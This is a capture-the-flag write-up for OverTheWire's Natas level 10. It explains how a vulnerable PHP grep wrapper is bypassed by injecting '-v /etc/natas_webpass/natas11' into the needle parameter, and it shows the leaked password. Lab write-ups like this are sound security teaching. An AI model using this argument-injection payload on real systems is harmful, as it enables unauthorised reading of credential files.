# Level 9 - Level 10: Natas - OverTheWire

## Level Goal

Username: natas10
URL:      http://natas10.natas.labs.overthewire.org

## Solution
This level is quite similar to the previous one (08-09), however, the difficulty is increased as we appear to have some filtering going on in the PHP logic:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This code is the same as before, except for this filter addition which we want to focus on:
```php
 if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
```

Essentially, this code is using the PHP `preg_match` function to match the regex pattern `'/[;|&]/'`. If the `needle` URL parameter contians a character also found in that pattern, we will get the `illegal character!` error message and the command will not execute.

We can use [https://regexr.com](https://regexr.com) to break down the regex if ever unsure, but in this case it's quite straightforward. Any character between the `[]` brackets will be matched, which is `;`, `|`, and `&`. This will obviously make it quite difficult to escape the command, like in the previous level.

With that said, we may be able to accomplish this without escaping the command, and taking advantage of `grep` itself. If we read the manpages of `grep`, we can see that it's actually possible to supply multiple files to the command, and `grep` will search all of them.

So, if we can get `grep` to search for basically everything in the file, and also provide it the `/etc/natas_webpass/natas11` file to search, we can in theory extract the password. To make that search for "everything", we can provide the `-v` flag, which will invert the `grep` command. Now, `grep` is searching for everything *except* for the pattern we provide. So now we can just provide a random pattern that won't match the password, like `12345`.

Next, we just need to provide the `/etc/natas_webpassnatas11` file as the first file argument. Puttng this together, `grep` will return everything *except* for `123456` in both `/etc/natas_webpassnatas11` and `dictionary.txt`.

I also realized, since we're reunning actual calls on the OS, we don't need to do any sort of directory walking (`../../` etc.), and we can just reference `/etc/natas_webpass` for example.

## Exploit payload

The final payload ends up becoming: `http://natas10.natas.labs.overthewire.org/?needle=12345 -v /etc/natas_webpass/natas11`, which, once URL-encoded, looks like: `http://natas10.natas.labs.overthewire.org/?needle=12345%20-v%20/etc/natas_webpass/natas11`

```html
Output:
<pre>
/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
dictionary.txt:
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
...
...
...
```